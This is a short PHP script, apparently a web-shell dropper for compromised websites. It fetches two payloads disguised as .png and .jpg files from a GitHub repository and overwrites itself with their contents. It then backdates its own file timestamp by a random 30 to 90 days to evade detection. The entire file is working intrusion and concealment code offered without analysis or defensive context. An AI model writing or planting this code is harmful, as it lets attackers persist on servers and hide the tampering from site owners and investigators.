<?php 
$thisfile = basename($_SERVER['SCRIPT_FILENAME']); 
$radio1 = file_get_contents("https://github.com/do124574/do124574/raw/main/teamm.png"); 
$radio2 = file_get_contents("https://github.com/do124574/do124574/raw/main/cucok.jpg");
			file_put_contents($thisfile, $radio1);
			file_put_contents($thisfile, $radio2, FILE_APPEND | LOCK_EX);	
			@touch($thisfile, strtotime('-'.rand(30,90).' days', time()));
?>